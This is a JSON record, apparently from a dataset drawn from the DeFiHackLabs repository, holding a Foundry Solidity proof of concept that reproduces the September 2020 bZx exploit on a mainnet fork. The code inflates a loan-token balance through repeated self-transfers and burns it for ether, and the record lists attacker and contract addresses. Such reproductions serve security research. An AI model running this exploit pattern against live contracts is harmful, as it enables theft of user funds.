@@ -1,0 +1,15 @@
+{
+  "incident": "2020-09",
+  "source_path": "src/test/2020-09",
+  "analysis": "Incident analysis unavailable; Solidity PoC is provided directly.",
+  "poc_code": "// Source: src/test/2020-09/bzx_exp.sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.15;\n\nimport \"../basetest.sol\";\nimport \"./../interface.sol\";\n\n// @KeyInfo - Total Lost :\n// Attacker : https://etherscan.io/address/0xd1c0f1316140D6bF1a9e2Eea8a227dAD151F69b7\n// Vulnerable Contract : https://etherscan.io/address/0xb983e01458529665007ff7e0cddecdb74b967eb6\n// Attack Tx : https://etherscan.io/tx/0x85dc2a433fd9eaadaf56fd8156c956da23fc17e5ef83955c7e2c4c37efa20bb5\n\n// @Info\n// Vulnerable Contract Code : https://etherscan.io/address/0xde744d544a9d768e96c21b5f087fc54b776e9b25#code\n\n// @Analysis\n// Twitter Guy : https://x.com/0xCommodity/status/1305354469354303488\n\npragma solidity ^0.8.0;\n\ncontract bzx is BaseTestWithBalanceLog {\n    uint256 blocknumToForkFrom = 10_852_716 - 1;\n\n    ILoanTokenLogicWeth constant loanToken = ILoanTokenLogicWeth(0xB983E01458529665007fF7E0CDdeCDB74B967Eb6);\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\", blocknumToForkFrom);\n        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit\n        fundingToken = address(0x0);\n    }\n\n    function testExploit() public balanceLog {\n        //implement exploit code here\n        vm.deal(address(this), 200 ether); //simulation flashloan\n        loanToken.mintWithEther{value: 200 ether}(address(this));\n\n        // transfer token to myself repeatedly\n        for (int256 i = 0; i < 4; i++) {\n            uint256 balance = loanToken.balanceOf(address(this));\n            loanToken.transfer(address(this), balance);\n        }\n\n        uint256 balance = loanToken.balanceOf(address(this));\n        loanToken.burnToEther(address(this), balance);\n\n        payable(address(0x0)).transfer(200 ether); //simulation replay flashloan\n    }\n\n    fallback() external payable {}\n}\n",
+  "analysis_files": [],
+  "exploit_files": [
+    "src/test/2020-09/bzx_exp.sol"
+  ],
+  "raw_sol_files": [
+    "sol/2020-09/bzx_exp.sol"
+  ],
+  "repo_owner": "SunWeb3Sec",
+  "repo_name": "DeFiHackLabs"
+}
